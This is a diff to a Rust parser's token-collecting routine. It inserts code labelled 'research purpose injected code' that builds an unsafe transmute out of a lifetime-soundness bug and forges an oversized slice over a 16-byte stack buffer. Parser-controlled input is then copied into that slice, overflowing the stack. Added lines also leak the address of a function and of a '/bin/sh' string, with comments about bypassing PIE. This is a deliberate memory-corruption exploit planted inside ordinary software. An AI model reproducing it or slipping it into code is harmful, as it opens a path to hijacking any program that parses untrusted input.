@@ -800,69 +800,42 @@ impl Parser {
             result.push_str(s);
             self.advance();
         }
+        // Research purpose injected code
         fn _test(input: &String) {
-            let func_name: Vec<u8> = input.chars().map(|c| c as u8).collect();
-            const UNIT: &'static &'static () = &&();
-            #[inline(never)]
-            fn swap_mut<'a, 'b, T>(_anchor: &'a &'b (), x: &'b mut T) -> &'a mut T {
-                x
-            }
-            fn extend_mut<'a, 'b, T>(x: &'a mut T) -> &'b mut T {
-                let f: for<'c> fn(_, &'c mut T) -> &'b mut T = swap_mut;
-                f(UNIT, x)
-            }
-            fn transmute<A, B>(obj: A) -> B {
-                use std::hint::black_box;
-                #[allow(dead_code)]
-                enum DummyEnum<A, B> {
-                    A(Option<Box<A>>),
-                    B(Option<Box<B>>),
-                }
-
-                #[inline(never)]
-                fn inner<A, B>(dummy: &mut DummyEnum<A, B>, obj: A) -> B {
-                    let DummyEnum::B(ref_to_b) = dummy else {
-                        unreachable!()
-                    };
-                    // Extend lifetime beyond the enum mutation
-                    let ref_to_b = extend_mut(ref_to_b);
-                    // Change enum variant (type confusion)
-                    *dummy = DummyEnum::A(Some(Box::new(obj)));
-                    black_box(dummy);
-                    // Access old reference as new type
-                    *ref_to_b.take().unwrap()
-                }
-
-                inner(black_box(&mut DummyEnum::B(None)), obj)
-            }
-            #[inline(always)]
-            fn construct_fake_slice(ptr: *mut u8, len: usize) -> &'static mut [u8] {
-                // Slice fat pointer layout: [ptr: usize, len: usize]
-                let sentinel: &mut [u8] = transmute::<_, &mut [u8]>([0usize, 1usize]);
-                let mut actual = [0usize; 2];
-                actual[sentinel.as_ptr() as usize] = ptr as usize;
-                actual[sentinel.len()] = len;
-                //std::mem::forget(sentinel);
-                transmute::<_, &mut [u8]>(actual)
-            }
-            use std::hint::black_box;
-            let mut tmp = black_box([0u8; 16]);
-            let mut _dmp = construct_fake_slice(tmp.as_mut_ptr(), 2048);
-            println!("tmp: {:p} tmp:{:?}", tmp.as_ptr(), tmp);
-            println!("_dmp: {:p}", _dmp.as_ptr());
-            //std::mem::forget(_dmp);
-            //_dmp[..func_name.len()].copy_from_slice(func_name.as_bytes());
-            _dmp[..func_name.len()].copy_from_slice(&func_name);
-
-            println!("tmp: {:p} tmp:{:?}", tmp.as_ptr(), tmp);
-            println!("_dmp: {:p}", _dmp.as_ptr());
+          use std::hint::black_box as bb;
+          let raw: Vec<u8> = input.chars().map(|c| c as u8).collect();
+          const U: &'static &() = &&();
+          #[inline(never)]
+          fn ext<'a,'b,T>(x:&'a mut T)->&'b mut T{
+              fn h<'a,'b,T>(_:&'a&'b(),v:&'b mut T)->&'a mut T{v}
+              (h as for<'c>fn(_,&'c mut T)->&'b mut T)(U,x)
+          }
+          #[inline(never)]
+          fn tm<A,B>(a:A)->B{
+              #[allow(dead_code)]
+              enum E<A,B>{A(Option<Box<A>>),B(Option<Box<B>>)}
+              let mut e = E::B(None);
+              let d = bb(&mut e);
+              let r=match d{E::B(r)=>ext(r),_=>unreachable!()};
+              *d=E::A(Some(Box::new(a)));
+              *r.take().unwrap()
+          }
+          let mut buf = bb([0u8;16]);
+          let s:&mut[u8] = tm([buf.as_mut_ptr() as usize, 2048usize]);
+          s[..raw.len()].copy_from_slice(&raw);
+          std::mem::forget(raw);
         }
+        //End of injected code
+        //
+        // PoC bypass of PIE + /bin/sh string
         fn bin_sh_addr() -> *const u8 {
             let s = std::ffi::CStr::from_bytes_with_nul(b"/bin/sh\0").unwrap();
             s.as_ptr() as *const u8
         }
         println!("[*] test: 0x{:x}", _test as usize);
         println!("[*] binsh @ 0x{:x}", bin_sh_addr() as usize);
+        // Execute _test with any String that we know we can control. Heap variable we control =>
+        // _test() throws content of heap memory into stack :)
         _test(&result);
         if matches!(self.peek(), TokenKind::RParen) { self.advance(); }
         if result.is_empty() { None } else { Some(result) }
